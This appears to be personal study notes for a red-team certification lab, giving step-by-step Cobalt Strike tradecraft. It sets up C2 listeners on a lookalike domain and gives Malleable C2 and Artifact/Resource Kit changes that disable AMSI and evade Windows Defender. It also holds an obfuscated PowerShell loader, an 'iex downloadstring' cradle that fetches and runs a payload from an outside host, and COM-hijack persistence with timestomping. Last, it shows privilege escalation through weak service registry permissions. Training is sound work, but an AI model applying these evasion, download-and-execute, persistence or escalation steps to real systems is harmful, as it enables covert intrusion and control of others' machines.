# CRTO-Notes

Notes for CRTO

## Create Listener CS

Http

    Name: http
    Payload: Beacon HTTP
    HTTP Hosts: www.bleepincomputer.com
    HTTP Host (Stager) : www.bleepincomputer.com

SMB

    Name: smb
    Payload: Beacon SMB
    Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337

TCP

    Name: tcp
    Payload: Beacon TCP
    Port: 4444
    Bind to localhost: False

TCP (local)

    Name: tcp-local
    Payload: Beacon TCP
    Port: 1337
    Bind to localhost: True

<img width="1069" height="578" alt="image" src="https://github.com/user-attachments/assets/a10ff89b-9fd4-4188-80fa-0458ea6703c9" />

Generate payloads for each listener.

    Go to Payloads > Windows Stageless Generate All Payloads
    Folder: C:\Payloads
    Click Generate
    
<img width="1064" height="244" alt="image" src="https://github.com/user-attachments/assets/5b9287ea-8be8-43d5-aba3-2ff23a1b8f5f" />

### Defence Evasion
## Malleable C2
Open a new PowerShell window in Terminal.
    SSH into the team server VM.
        ssh attacker@10.0.0.5
        The password is Passw0rd!.

    Move into the profiles directory.
        cd /opt/cobaltstrike/profiles

    Open default.profile in a text editor (e.g. vim or nano).

    Add the following stage block:
#### Tambahin paling bawah 
    Profile
    TypeCopy
    stage {
        set userwx "false";
        set cleanup "true";
        set copy_pe_header "false";
        set module_x64 "Hydrogen.dll";

        transform-x64 {
            strrep "beacon.x64.dll" "bacon.x64.dll";
            strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
            strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
            strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
            strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
        }
    }

    Add the following post-ex block:

    Profile
    TypeCopy
    post-ex {
        set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
        set cleanup "true";
        set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
        set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
        set amsi_disable "true";

        transform-x64 {
            strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
            strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
            strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
            strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
            strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
        }
    }

    Add the following process-inject block:

    Profile
    TypeCopy
    process-inject {
        set allocator "VirtualAllocEx";
        set bof_allocator "VirtualAlloc";
        set bof_reuse_memory "true";
        set min_alloc "8192";
        set startrwx "false";
        set userwx "false";

        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
            NtQueueApcThread-s;
            NtQueueApcThread;
            SetThreadContext;
        }
    }
### Save the changes.
### Restart the team server.
        sudo /usr/bin/docker restart cobaltstrike-cs-1

    Check the container logs to ensure there are no profile errors.
        sudo /usr/bin/docker logs cobaltstrike-cs-1

## Artifact Kit

    Launch Visual Studio Code.

    Go to File > Open Folder and select C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

    Navigate to src-common and open patch.c.

    Scroll to line ~45 and modify the for loop. This is for the svc exe payloads.

    c
    TypeCopy
    x = length;
    while ( x-- ) {
      * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

    Scroll to line ~116 and modify the other for loop. This is for the normal exe payloads.

    c
    TypeCopy
    int x = length;
    while ( x-- ) {
      * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

### Save the changes (File > Save) and close the folder (File > Close Folder).

### On the Windows taskbar, right-click on the Terminal icon and launch Ubuntu WSL.
### Change the working directory.
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

    Run build.sh to build the new artifacts.
    ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

## Load the Aggressor Script.
      Open the Cobalt Strike client.
      Go to Cobalt Strike > Script Manager.
      Click Load.
      Navigate to C:\Tools\cobaltstrike\custom-artifacts\mailslot and select artifact.cna.


    
### Resource Kit
## If not already open from the previous task, launch Ubuntu WSL from the Windows Terminal.
## Change the working directory on unbuntu.
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
## Run build.sh to copy the resource templates.
        ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
## If not already open from the previous task, launch Visual Studio Code.
## Go to File > Open Folder and select C:\Tools\cobaltstrike\custom-resources.
## Select template.x64.ps1.
## Scroll to line 5 and replace .Equals('System.dll') with .Equals('Sys'+'tem.dll').
## Scroll to line 32 and replace it with:
    $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
    $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

## Save the changes (File > Save).
# Select compress.ps1.
Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:
## PowerShell
    SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

## Save the changes (File > Save).
    Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.
## Testing

    Host a 64-bit PowerShell payload.
        Go to Attacks > Scripted Web Delivery
        Select the http listener.
        Click Launch.

    Switch to Workstation and login with Passw0rd!.

    Open a PowerShell window.

    Download and invoke the PowerShell payload.

## PowerShell
    iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")

    Switch back to Attacker Desktop and a new Beacon should be checking in.

    From the new Beacon, impersonate a local admin to lon-ws-1.
        make_token CONTOSO\rsteel Passw0rd!

    Change the spawnto for the service payload.
        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

    Move laterally to lon-ws-1.
        jump psexec64 lon-ws-1 smb

<img width="1062" height="526" alt="image" src="https://github.com/user-attachments/assets/add66db3-6b75-48d1-badd-098f71736af4" />

    In this lab, you have bypasses Windows Defender by modifying Cobalt Strike's default artifacts, resources, and post-exploitation behaviours.

# Initial Access

## Persistence

    Generate a DLL payload:
        Payloads > Windows Stageless Payload
        Listener: http
        Output: Windows DLL
        Exit Function: Thread
        Click Generate.
        Save it to C:\Payloads\http_x64.dll.

    We choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.


## COM Hijack

From the Beacon running as pchilds:

Change Beacon's working directory.

beacon
    cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
Upload the DLL payload to disk.
        upload C:\Payloads\http_x64.dll
Rename and timestomp the DLL to help it blend in with the existing files.
        mv http_x64.dll Microsoft.Teams.HttpClient.dll
        timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
Add the registry entries to perform the COM hijack:    
        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

Switch to Workstation 1 and login with Passw0rd!. From the Windows start menu, launch Microsoft Teams.
Switch back to the Attacker Desktop and a new Beacon should appear from ms-teams.exe.
## In this lab, you have leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.

# Privesc
## Enumeration
The objective of this lab is to exploit weak registry permissions on a service for privilege escalation.
Interact with the Beacon running as pchilds.
Change the spawnto to msedge.
    spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Use PowerShell to search for services where low-priv users have FullControl rights.
    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

return : This should return BadWindowsService.
<img width="755" height="245" alt="image" src="https://github.com/user-attachments/assets/4cb7cff0-dec8-4064-99e0-848b6f4c87dc" />

## Exploitation
Set the spawnto for the service binary payload.
        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
Generate a service binary payload.
        Payloads > Windows Stageless Payload.
        Listener: http
        Output: Windows Service EXE
        Click Generate
        Save to C:\Payloads\http_x64.svc.exe
Stop the service.
        sc_stop BadWindowsService
Change Beacon's current working directory.
        cd C:\Temp
    Upload the payload to disk.
        upload C:\Payloads\http_x64.svc.exe
    Get the service's current binary path.
        sc_qc BadWindowsService
    Reconfigure the service to point to the payload.
        sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
    Start the service.
        sc_start BadWindowsService
The elevated Beacon should appear within a few seconds.
<img width="972" height="503" alt="image" src="https://github.com/user-attachments/assets/e01a662b-0b0e-4b91-b111-2c739019fc6b" />

Restore the service's binary path.
beacon
    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2 
Delete the service payload.
    rm http_x64.svc.exe
Start the service again.
    sc_start BadWindowsService
### In this lab, you have abused a weak service permission for privilege escalation.



    




